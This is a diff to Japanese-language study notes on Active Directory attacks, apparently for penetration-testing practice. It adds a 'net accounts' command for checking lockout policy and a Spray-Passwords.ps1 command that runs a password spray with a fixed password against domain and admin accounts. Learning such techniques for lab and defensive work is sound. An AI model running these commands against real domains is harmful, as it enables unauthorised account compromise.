@@ -223,6 +223,12 @@ setspn -L iis_service
 net group "Management Department" stephanie /add /domain
 ```
 
+9. 現在ドメインにログインしているユーザのアカウント情報やロックアウトポリシーを確認する。  
+パスワードの最小文字数などのポリシーも確認できる。
+```
+net accounts
+```
+
 ## PowerView
 1. インポートする
 ```
@@ -297,3 +303,10 @@ Find-DomainShare
 "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
 ```
 
+## Spray-Passwords.ps1  
+パスワードスプレー攻撃をドメイン内で行うツール
+  
+1. Nexus123!のパスワードを使ってパスワードスプレー。-Adminで管理者アカウントのテストも行う。
+```
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+```
